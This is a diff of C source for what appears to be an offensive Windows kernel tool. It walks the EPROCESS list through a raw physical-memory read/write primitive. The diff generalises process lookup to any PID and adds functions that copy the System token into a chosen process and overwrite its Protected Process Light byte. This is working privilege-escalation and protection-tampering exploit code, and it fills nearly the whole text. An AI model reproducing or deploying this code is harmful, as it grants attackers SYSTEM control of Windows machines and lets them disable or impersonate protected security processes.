@@ -614,13 +614,14 @@ recurse:
     WalkAndSpoofVAD(dev, sc, right, cr3, offsets, depth + 1, spoofed, visited);
 }
 
-// Walk PsActiveProcessHead and return the EPROCESS that belongs to ourPid.
+// Walk PsActiveProcessHead and return the EPROCESS that belongs to targetPid.
 // The list is a circular doubly-linked list of LIST_ENTRYs embedded in each
 // EPROCESS, so following Flink must come back to the head after visiting every
 // process. Dying after a handful of entries means the head RVA is wrong, not
 // that the system has three processes.
-static bool FindOurEprocess(ULONG64 cr3, KernelOffsets* offsets, ULONG64 listHeadVA,
-                            DWORD ourPid, int* walked, ULONG64* outEprocVA) {
+static bool FindEprocessByPid(ULONG64 cr3, KernelOffsets* offsets, ULONG64 listHeadVA,
+                              DWORD targetPid, bool verbose, int* walked,
+                              ULONG64* outEprocVA) {
     ULONG64 currentLink = WindowReadKernelPtr(cr3, listHeadVA, "PsActiveProcessHead");
 
     int count = 0;
@@ -636,20 +637,21 @@ static bool FindOurEprocess(ULONG64 cr3, KernelOffsets* offsets, ULONG64 listHea
         }
 
         ULONG64 pid = WindowRead64(eprocessPA + offsets->UniqueProcessId);
-        if ((DWORD)pid == ourPid) {
+        if ((DWORD)pid == targetPid) {
             *outEprocVA = eprocessVA;
             *walked = count;
             return true;
         }
-        if (count <= 8)
+        if (verbose && count <= 8)
             printf("[*]   entry %d: link 0x%llX eprocess 0x%llX pid %llu\n",
                    count, currentLink, eprocessVA, pid);
 
         currentLink = WindowReadKernelPtr(cr3, currentLink, "EPROCESS Flink");
     }
 
-    printf("[-] EPROCESS list ended after %d entries: Flink 0x%llX (head 0x%llX)\n",
-           count, currentLink, listHeadVA);
+    if (verbose)
+        printf("[-] EPROCESS list ended after %d entries: Flink 0x%llX (head 0x%llX)\n",
+               count, currentLink, listHeadVA);
     *walked = count;
     return false;
 }
@@ -711,24 +713,76 @@ static bool RecoverEprocessListHead(ULONG64 systemCr3, KernelOffsets* offsets,
 }
 
 bool WindowFindOurEprocess(ULONG64 systemCr3, KernelOffsets* offsets, ULONG64* outEprocVA) {
-    DWORD ourPid = GetCurrentProcessId();
+    return WindowFindEprocessByPid(systemCr3, offsets, GetCurrentProcessId(), true, outEprocVA);
+}
+
+bool WindowFindEprocessByPid(ULONG64 systemCr3, KernelOffsets* offsets, DWORD pid,
+                             bool verbose, ULONG64* outEprocVA) {
     ULONG64 psActiveVA = offsets->NtoskrnlBase + offsets->PsActiveProcessHead;
 
     int count = 0;
     *outEprocVA = 0;
-    if (FindOurEprocess(systemCr3, offsets, psActiveVA, ourPid, &count, outEprocVA))
+    if (FindEprocessByPid(systemCr3, offsets, psActiveVA, pid, verbose, &count, outEprocVA))
         return true;
 
-    printf("[-] Own EPROCESS not found via PsActiveProcessHead (RVA 0x%llX, %d entries walked)\n",
-           offsets->PsActiveProcessHead, count);
+    if (verbose)
+        printf("[-] PID %u not found via PsActiveProcessHead (RVA 0x%llX, %d entries walked)\n",
+               pid, offsets->PsActiveProcessHead, count);
 
+    // The head can be recovered from the System process, which is worth trying
+    // for any PID, not just our own.
     ULONG64 recovered = 0;
-    if (RecoverEprocessListHead(systemCr3, offsets, ourPid, &recovered) &&
-        FindOurEprocess(systemCr3, offsets, recovered, ourPid, &count, outEprocVA))
+    int probe = 0;
+    if (RecoverEprocessListHead(systemCr3, offsets, pid, &recovered) &&
+        FindEprocessByPid(systemCr3, offsets, recovered, pid, verbose, &probe, outEprocVA))
         return true;
 
-    printf("[-] Could not locate our EPROCESS\n");
+    if (verbose)
+        printf("[-] Could not locate the EPROCESS for PID %u\n", pid);
     *outEprocVA = 0;
+    return false;
+}
+
+// The System process's primary token object (a kernel pointer).
+ULONG64 WindowSystemToken(ULONG64 systemCr3, KernelOffsets* offsets) {
+    if (!offsets->Token || !offsets->PsInitialSystemProcess) return 0;
+
+    ULONG64 sysPtrPA = WindowVirtToPhys(systemCr3,
+        offsets->NtoskrnlBase + offsets->PsInitialSystemProcess);
+    if (!sysPtrPA) return 0;
+
+    ULONG64 sysEproc = WindowRead64(sysPtrPA);
+    if (!sysEproc) return 0;
+
+    ULONG64 sysTokPA = WindowVirtToPhys(systemCr3, sysEproc + offsets->Token);
+    if (!sysTokPA) return 0;
+    return WindowRead64(sysTokPA);
+}
+
+// Point an EPROCESS's primary token at the System token.
+bool WindowSetProcessToken(ULONG64 systemCr3, KernelOffsets* offsets,
+                           ULONG64 eprocVA, ULONG64 systemToken, const char* what) {
+    if (!offsets->Token || !systemToken || !eprocVA) return false;
+
+    ULONG64 tokPA = WindowVirtToPhys(systemCr3, eprocVA + offsets->Token);
+    if (!tokPA) {
+        printf("[-] %s: token field did not translate\n", what);
+        return false;
+    }
+
+    ULONG64 before = WindowRead64(tokPA);
+    if (before == systemToken) {
+        printf("[*] %s is already the System token\n", what);
+        return true;
+    }
+
+    WindowWrite64(tokPA, systemToken);
+    ULONG64 after = WindowRead64(tokPA);
+    if (after == systemToken) {
+        printf("[+] %s token -> SYSTEM (0x%llX -> 0x%llX)\n", what, before, systemToken);
+        return true;
+    }
+    printf("[-] %s: token swap rejected (0x%llX)\n", what, after);
     return false;
 }
 
@@ -737,51 +791,52 @@ bool SetProcessSystemToken(ULONG64 systemCr3, KernelOffsets* offsets) {
         printf("[-] _EPROCESS::Token unavailable, cannot change the process token\n");
         return false;
     }
-    if (!offsets->PsInitialSystemProcess) {
-        printf("[-] PsInitialSystemProcess unavailable\n");
+
+    ULONG64 systemToken = WindowSystemToken(systemCr3, offsets);
+    if (!systemToken) {
+        printf("[-] Could not read the System process token\n");
         return false;
     }
 
     ULONG64 ourEproc = 0;
     if (!WindowFindOurEprocess(systemCr3, offsets, &ourEproc)) return false;
 
-    ULONG64 sysPtrPA = WindowVirtToPhys(systemCr3,
-        offsets->NtoskrnlBase + offsets->PsInitialSystemProcess);
-    if (!sysPtrPA) return false;
-    ULONG64 sysEproc = WindowRead64(sysPtrPA);
-    if (!sysEproc) {
-        printf("[-] PsInitialSystemProcess reads as 0\n");
+    return WindowSetProcessToken(systemCr3, offsets, ourEproc, systemToken, "Our process");
+}
+
+// Protection is one byte; read it back so "it did not stick" is never reported
+// as success. The field is write protected on some builds, and silently losing
+// the write is worse than knowing.
+BYTE WindowGetProcessProtection(ULONG64 systemCr3, KernelOffsets* offsets, ULONG64 eprocVA) {
+    if (!eprocVA) return 0;
+    ULONG64 protPA = WindowVirtToPhys(systemCr3, eprocVA + offsets->Protection);
+    return protPA ? WindowRead8(protPA) : 0;
+}
+
+bool WindowSetProcessPpl(ULONG64 systemCr3, KernelOffsets* offsets,
+                         ULONG64 eprocVA, BYTE level) {
+    if (!eprocVA) return false;
+
+    ULONG64 protPA = WindowVirtToPhys(systemCr3, eprocVA + offsets->Protection);
+    if (!protPA) {
+        printf("[-] Protection (off 0x%X) did not translate\n", offsets->Protection);
         return false;
     }
 
-    ULONG64 sysTokPA = WindowVirtToPhys(systemCr3, sysEproc + offsets->Token);
-    ULONG64 ourTokPA = WindowVirtToPhys(systemCr3, ourEproc + offsets->Token);
-    if (!sysTokPA || !ourTokPA) {
-        printf("[-] Token fields did not translate (System 0x%llX, ours 0x%llX)\n",
-               sysTokPA, ourTokPA);
-        return false;
-    }
-
-    ULONG64 systemToken = WindowRead64(sysTokPA);
-    if (!systemToken) {
-        printf("[-] System process token reads as 0\n");
-        return false;
-    }
-
-    ULONG64 before = WindowRead64(ourTokPA);
-    if (before == systemToken) {
-        printf("[+] Process token is already the System token 0x%llX\n", systemToken);
+    BYTE before = WindowRead8(protPA);
+    if (before == level) {
+        printf("[+] PPL already 0x%02X\n", level);
         return true;
     }
 
-    WindowWrite64(ourTokPA, systemToken);
-
-    ULONG64 after = WindowRead64(ourTokPA);
-    if (after == systemToken) {
-        printf("[+] Process token -> System (0x%llX -> 0x%llX)\n", before, systemToken);
+    WindowWriteBuffer(protPA, &level, 1);
+    BYTE after = WindowRead8(protPA);
+    if (after == level) {
+        printf("[+] PPL set (0x%02X, was 0x%02X)\n", level, before);
         return true;
     }
-    printf("[-] Token swap rejected by the kernel (0x%llX)\n", after);
+    printf("[-] PPL write did not stick (0x%02X, wanted 0x%02X) "
+           "- the field is write protected\n", after, level);
     return false;
 }
 
